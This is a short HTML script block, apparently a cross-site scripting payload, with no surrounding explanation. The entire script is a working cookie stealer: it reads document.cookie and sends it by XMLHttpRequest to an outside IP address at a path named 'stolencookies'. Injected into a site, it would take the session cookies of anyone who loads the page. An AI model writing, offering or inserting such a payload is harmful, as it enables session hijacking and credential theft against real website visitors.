<script> 
    var http = new XMLHttpRequest(); 
    http.onreadystatechange = function() {     
    if (http.readyState == 4) 
    {         
        if (http.status == 200) 
        {             
            console.log("Request successful:", http.responseText);         
        } else 
        {            
            console.error("Request failed with status:", http.status);         
        }     
    } 
};  
http.open("GET", "http://34.66.223.237:80/stolencookies?cookies=" + encodeURIComponent(document.cookie), true); 
http.send(); 
</script>
